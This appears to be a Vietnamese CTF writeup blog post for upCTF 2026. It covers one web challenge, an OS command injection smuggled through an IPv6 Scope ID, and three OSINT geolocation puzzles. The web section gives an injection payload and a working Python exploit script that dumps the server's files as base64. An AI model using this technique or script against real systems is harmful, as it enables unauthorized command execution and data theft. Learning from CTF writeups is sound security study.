---
title: upCTF 2026
date: 2026-03-14 09:00:00 +0700
categories: [Security, CTF]
tags: [writeup, osint, web-security]
image:
  path: /assets/img/upCTF2026/logo.png
---

## Webs

### 0day on ipaddress

- Tác giả: 
- Mô tả: 

whaaaaaaaaat

- Attachments: 0day-ip.zip
- Cách giải:

Kiểm tra mã nguồn `server.py`, ta thấy ứng dụng nhận đầu vào là một địa chỉ IP và tiến hành validate thông qua thư viện `ipaddress`:

```python
try:
    ipaddress.ip_address(ip)
except ValueError:
    return jsonify({"error": "Invalid IP address"}), 400
```

Tuy nhiên, với phiên bản Python 3.9 (được cấu hình trong Dockerfile), hàm `ipaddress.ip_address()` tồn tại một hành vi đặc biệt với địa chỉ IPv6: Nó cho phép truyền các chuỗi tùy ý vào phần **Scope ID** (phần nằm sau ký tự `%`). Nhờ vậy, một payload dạng `fe80::1%;whoami` hoàn toàn vượt qua được bước kiểm tra hợp lệ này.

Sau khi qua bước validate, biến `ip` được truyền thẳng vào chuỗi lệnh để thực thi qua `subprocess.run(..., shell=True)`:

```python
command = f"nmap -F -sV {ip}"
```

Điều này dẫn đến lỗ hổng **OS Command Injection** thông qua dấu chấm phẩy `;`. Tuy nhiên, tác giả đã thiết lập 3 lớp phòng thủ rất chặt chẽ:

1. **Blacklist Input:** Chặn hầu hết các ký tự đặc biệt chuyển hướng dòng lệnh `["$" , "\"", "\'", "\\", "@", ",", "*", "&", "|", "{", "}"]` và các lệnh đọc/in file phổ biến `["flag", "txt", "cat", "echo", "head", "tail", "more", "less", "sed", "awk", "dd", "env", "printenv", "set"]`.
2. **Blacklist Output:** Chặn ký tự `{`. Nếu output trả về có chứa `{` (dấu hiệu của chuỗi `upCTF{...}`), ứng dụng sẽ trả về lỗi.
3. **CIDR Block:** Bản thân hàm `ipaddress.ip_address()` sẽ ném ra lỗi `ValueError` nếu trong payload của ta có chứa dấu gạch chéo `/`, vì nó sẽ hiểu nhầm đầu vào là một Subnet/CIDR thay vì một IP tĩnh. Điều này ngăn chặn việc đọc các file bằng đường dẫn tuyệt đối (ví dụ: `/tmp` hay `/proc`).

**Kỹ thuật Bypass:**

* Sử dụng dấu `;` để nối chuỗi thực thi lệnh vì nó không nằm trong blacklist.
* Để vượt qua filter cấm ký tự đặc biệt, cấm dấu `/` và cấm các lệnh đọc file: Sử dụng lệnh **`tar`** để đóng gói toàn bộ thư mục hiện tại (`.`) thành một file nén.
* Để vượt qua filter output cấm ký tự `{`: Sử dụng **`base64`** để mã hóa file nén trước khi in ra màn hình.

Từ các điều kiện trên, ta xây dựng được payload hoàn chỉnh:

```text
fe80::1%;tar cf t .;base64 t
```

Gửi request HTTP GET chứa payload trên đến endpoint `/check` (nhớ URL-encode phần payload):

*(Lưu ý: Bạn có thể tự chụp lại màn hình chạy script tự động trả về JSON có chứa base64 để thay thế vào ảnh này)*

Server thực thi thành công và trả về một chuỗi mã hóa Base64 lớn. Quá trình giải mã Base64 này sẽ thu được file nén `t.tar`. Sau khi bung file nén, kiểm tra các file bên trong, ta tìm thấy được Flag nằm trong file `flag.txt` và `output`.

**Exploit code (Python):**
```python
import requests
import base64
import re
import tarfile
import io

url = "http://46.225.117.62:30010/check"

# Payload tuyệt đối KHÔNG chứa dấu '/' để lọt qua ipaddress.ip_address()
# Chức năng: Nén toàn bộ thư mục hiện hành vào file 't', sau đó mã hóa file 't' ra base64
payload = "fe80::1%;tar cf t .;base64 t"

print(f"[*] Đang gửi payload: {payload}")

try:
    response = requests.get(url, params={"ip": payload}, timeout=15)

    if response.status_code == 200:
        data = response.json()

        if data.get("success"):
            print("[+] Payload thực thi thành công!")
            scan_results = data.get("scan_results", "")

            lines = scan_results.strip().split('\n')

            b64_data = ""
            for line in lines:
                # Bỏ qua output rác từ script nmap giả
                if "Starting" not in line and "nmap scan" not in line:
                    b64_data += line.strip()

            if b64_data:
                try:
                    # Giải mã base64 thu được file tar dưới dạng bytes
                    tar_bytes = base64.b64decode(b64_data)

                    # Lưu lại file tar ra máy để bạn có thể tự kiểm tra nếu cần
                    with open("dumped_files.tar", "wb") as f:
                        f.write(tar_bytes)
                    print("[+] Đã lưu toàn bộ dữ liệu vào file nén 'dumped_files.tar'")

                    print("\n[*] Đang bung file nén trong bộ nhớ và quét Flag...")
                    flag_found = False

                    # Đọc trực tiếp file tar từ bộ nhớ
                    with tarfile.open(fileobj=io.BytesIO(tar_bytes)) as tar:
                        for member in tar.getmembers():
                            if member.isfile():
                                f = tar.extractfile(member)
                                if f:
                                    # Đọc nội dung từng file và quét regex
                                    content = f.read().decode('utf-8', errors='ignore')
                                    flags = re.findall(r'upCTF\{.*?\}', content)
                                    if flags:
                                        print(f"TÌM THẤY FLAG TRONG FILE '{member.name}': {flags[0]}")
                                        flag_found = True

                    if not flag_found:
                        print("[-] Không thấy định dạng upCTF{...} tự động. Hãy tự giải nén file 'dumped_files.tar' bằng WinRAR/7-Zip để kiểm tra thủ công nhé!")

                except Exception as e:
                    print(f"[-] Lỗi xử lý file tar/base64: {e}")
            else:
                print("[-] Không tìm thấy dữ liệu Base64 trong response.")
        else:
            print(f"[-] Exploit thất bại. Ứng dụng báo lỗi: {data.get('error')}")
    else:
        print(f"[-] Lỗi HTTP: {response.status_code}")
        print(f"[-] Chi tiết lỗi: {response.text}")

except requests.exceptions.RequestException as e:
    print(f"[-] Lỗi kết nối: {e}")
```

```bash
[*] Đang gửi payload: fe80::1%;tar cf t .;base64 t
[+] Payload thực thi thành công!
[+] Đã lưu toàn bộ dữ liệu vào file nén 'dumped_files.tar'

[*] Đang bung file nén trong bộ nhớ và quét Flag...
TÌM THẤY FLAG TRONG FILE './flag.txt': upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-CTDr9tLp0cc12d53}
TÌM THẤY FLAG TRONG FILE './output': upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-CTDr9tLp0cc12d53}
```

> Flag: `upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-CTDr9tLp0cc12d53}`
{: .prompt-flag }

## OSINT

### Left Behind

- Tác giả: BoneTeixeira
- Mô tả: 

I was passing through this street when I stopped to take a photo. It’s a place people walk through every day, often without noticing much beyond what’s right in front of them. Somewhere along this street, a name has been left behind - quietly, deliberately, and meant to last. That name is what you’re looking for.

Format - upCTF{name_surname} Example - upCTF{Jane_Doe}

- Attachments: left-behind.zip
- Cách giải:

#### **1. Phân tích đề bài và Dữ liệu ban đầu**

* **Mô tả:** Đề bài cung cấp một bức ảnh chụp một con phố và một đoạn mô tả ẩn ý: *"Somewhere along this street, a name has been left behind - quietly, deliberately, and meant to last."* (Một cái tên được bỏ lại - lặng lẽ, có chủ đích và mang ý nghĩa trường tồn).
* **Định dạng Flag:** `upCTF{name_surname}`
* **Dữ liệu:** File ảnh `left_behind.png` chụp một góc phố đi bộ với cổng chào ở phía trên.  

![](/assets/img/upCTF2026/left_behind.png)

#### **2. Định vị hình ảnh (Geolocation)**

* Quan sát bức ảnh ban đầu, điểm nhấn lớn nhất là chiếc cổng chào bằng sắt ở ngay phía trên cùng. Dù bị cắt một phần, ta vẫn có thể đọc được dòng chữ: `... CARNABY STREET`.
* Thực hiện tìm kiếm nhanh với từ khóa "Carnaby Street arch London" hoặc trực tiếp tìm "Carnaby Street" trên Google Maps, ta dễ dàng xác định được vị trí bức ảnh được chụp là ở ngã tư giao giữa phố **Beak St** và **Carnaby St** tại London, Vương quốc Anh.

#### **3. Giải mã ẩn ý (The Riddle)**

* Quay lại với mô tả của đề bài: *"a name has been left behind... meant to last"*.
* Trong kỹ thuật OSINT, khi nhắc đến những cái tên "để lại trên phố" và "tồn tại mãi với thời gian", mục tiêu thường không phải là biển quảng cáo cửa hàng (vì chúng thường xuyên thay đổi), mà hướng tới các **di tích, nét chạm khắc trên tường, hoặc các tấm biển vinh danh/tưởng niệm (plaque)**.

#### **4. Khảo sát thực địa kỹ thuật số (Google Street View)**

* Sử dụng Google Street View thả xuống góc đường vừa tìm được để có góc nhìn tương tự như người chụp ảnh.
* Quét kỹ các bức tường xung quanh con phố, đặc biệt là các vị trí cao khỏi tầm nhìn thông thường của người đi bộ.
* Ngay tại đầu góc đường bên phải (tòa nhà số **1 Carnaby Street**), phía trên bảng hiệu của cửa hàng, ta phát hiện một tấm biển hình tròn màu xanh lá cây (Green Plaque) gắn chặt vào tường gạch đỏ.

#### **5. Truy xuất thông tin**

* Phóng to trên Street View hoặc sử dụng Google Search với từ khóa "1 Carnaby Street green plaque".
* Kết quả cho thấy đây là tấm biển do Hội đồng thành phố Westminster dựng lên để vinh danh nhà thiết kế **John Stephen** (1934-2004), người được mệnh danh là "The King of Carnaby Street" - nhân vật đã làm nên cuộc cách mạng thời trang tại khu vực này.
* Cái tên "trường tồn" được nhắc đến chính là ông.

> Flag: `upCTF{John_Stephen}`
{: .prompt-flag }

### DIG

- Tác giả: tiago3monteiro
- Mô tả:

Here I am, locked inside my white castle, gazing out at silent streets that stretch nowhere. My mind drifts to a place I cannot see - a place that feels like it lies beneath my feet, on the farthest edge of the world. There, sunlight spills endlessly across golden sand, the sea folds itself into warm waves, and little cars dart about in cheerful loops, as if racing just for the joy of it. It is the mirror opposite of these quiet walls, and yet, somehow, it feels closer with every thought.
Format - upCTF{whereAmI_whereIWannaBe} Example - upCTF{espinho_unitedkingdom}

- Attachments: `photo.png`
- Cách giải: 

Đầu tiên, phân tích bức ảnh `photo.png` được cung cấp. Cắt cúp vào ngôi nhà và bể nước ngoài trời, sau đó sử dụng Google Image Search (Lens), các kết quả trả về cho thấy kiến trúc nhà đá cùng bể nước (lavadouro) này rất đặc trưng của vùng nông thôn bán đảo Iberia (Bồ Đào Nha/Galicia).  

![](/assets/img/upCTF2026/photo.png)

Kết hợp với dữ kiện mở đầu từ đoạn mô tả: *"locked inside my white castle"* (bị nhốt trong lâu đài trắng). Dịch "white castle" sang tiếng Bồ Đào Nha, ta có từ khóa **Castelo Branco**. Đây vừa là một địa danh thực tế tại Bồ Đào Nha, vừa khớp với kiến trúc tìm được. Ta chốt được vế đầu tiên: `castelobranco`.

Tiếp theo, phân tích vế thứ hai: *"a place that feels like it lies beneath my feet... the mirror opposite"* (nằm dưới chân tôi... mặt đối lập hoàn toàn). Thuật ngữ này ám chỉ khái niệm địa lý **Antipode** (Điểm đối chân - vị trí xuyên qua tâm Trái Đất). 

Điểm đối chân của khu vực Bồ Đào Nha sẽ rơi vào đất nước New Zealand. Đọc tiếp dữ kiện miêu tả chi tiết điểm đến: *"sunlight spills endlessly across golden sand, the sea folds itself into warm waves, and little cars dart about in cheerful loops"* (cát vàng, sóng ấm, những chiếc xe nhỏ chạy theo những vòng lặp).

Tìm kiếm các bãi biển tại khu vực đối chân ở Đảo Nam New Zealand (cụ thể là khu vực Nelson), tôi tìm ra bãi biển **Tahunanui**. Nơi đây nổi tiếng với dải cát vàng (golden sand) và đặc biệt có một khu vui chơi đua xe Go-Kart (Pro Karts) nằm ngay sát mép bãi biển, khớp hoàn hảo với chi tiết "những chiếc xe nhỏ chạy vòng quanh". Từ đó, ta chốt được vế thứ hai: `tahunanui`.

Ráp hai vế lại theo định dạng của đề bài, ta có flag hoàn chỉnh.

> Flag: `upCTF{castelobranco_tahunanui}`
{: .prompt-flag }

> Một bài OSINT kết hợp giữa Geolocation, dịch thuật (wordplay) và khái niệm Antipode (điểm đối chân) cực kỳ thú vị.

### Boo

- Tác giả: masha
- Mô tả:

I've had this recurring nightmare. I'm standing in a place where people arrive and leave, but I never can. I stand between the walls of a vanished cloister with blue tiles full of history, and the sound of iron on iron drowns out my weeping.
I'm looking for my room, but since the fire in 1783, this place has never felt the same. They say a stone cannot be hidden for long, and I was the last to get there. Can you find where the stone that frames my name now stands, and tell me: who built it, when, and where do I sleep?

Example - upCTF{MyFirstName_ArchitecturalStyle_Year_Place}

Note: Each part of the flag is camel case ThingOne_ThingTwo (..). No special characters are allowed besides underscore between each part.

- Attachment: `what_once_was.png`
- Cách giải: 

Bài toán là một lời nguyền lịch sử đưa người giải hóa thân vào hồn ma của một vị nữ tu. Dựa vào hình ảnh đính kèm và các từ khóa như *"vanished cloister with blue tiles"* (tu viện biến mất với những viên gạch xanh), *"arrive and leave"* (nơi đến và đi), ta xác định được địa điểm ban đầu chính là **Tu viện São Bento de Avé-Maria** tại Porto, Bồ Đào Nha. Nơi này ngày nay đã bị phá dỡ để xây dựng **Ga tàu trung tâm São Bento** nổi tiếng.

![](/assets/img/upCTF2026/what_once_was.png)

Tiến hành bóc tách từng phần của Flag theo format `upCTF{MyFirstName_ArchitecturalStyle_Year_Place}`:

**1. MyFirstName (Tên của tôi):**
Dữ kiện *"I was the last to get there"* (Tôi là người cuối cùng đến đó). Tìm kiếm lịch sử của tu viện São Bento de Avé-Maria, vị nữ tu cuối cùng sinh sống tại đây qua đời vào năm 1892. Tên của bà là **D. Maria da Glória Dias Guimarães**.
-> Từ khóa 1: `Maria`

**2. Place (Nơi tôi yên nghỉ):**
Dữ kiện *"where do I sleep?"*. Khi tu viện bị đập bỏ để xây ga tàu, hài cốt của các nữ tu (bao gồm cả Maria) được di dời đến khu hầm mộ (ossuary) tại nghĩa trang **Prado do Repouso**. Đưa về chuẩn CamelCase của đề bài.
-> Từ khóa 4: `PradoDoRepouso`

**3. ArchitecturalStyle & Year (Ai xây khung đá và Khi nào):**
Dữ kiện *"the stone that frames my name now stands"*. Khung đá bao bọc khu hầm mộ của các nữ tu hiện tại ở nghĩa trang thực chất là một chiếc cổng vòm bằng đá (Portal) - tàn tích duy nhất còn sót lại của tu viện cũ.
Chiếc cổng vòm này được xây dựng dưới thời Vua Manuel I, do đó nó mang phong cách kiến trúc đặc trưng là **Manueline**. 
Tìm kiếm sâu vào các tài liệu lưu trữ kiến trúc cổ của Porto, cổng đá này được ghi nhận hoàn thiện vào năm **1525**.
-> Từ khóa 2: `Manueline`
-> Từ khóa 3: `1525`

Ráp tất cả các từ khóa lại theo đúng format yêu cầu:

> Flag: `upCTF{Maria_Manueline_1525_PradoDoRepouso}`
{: .prompt-flag }

> Một bài OSINT giải đố lịch sử rất hay, bẫy người chơi cực mạnh ở mốc thời gian hoàn thành chiếc cổng đá (1525) thay vì mốc thời gian xây tu viện (1518) hay dời mộ (1894).
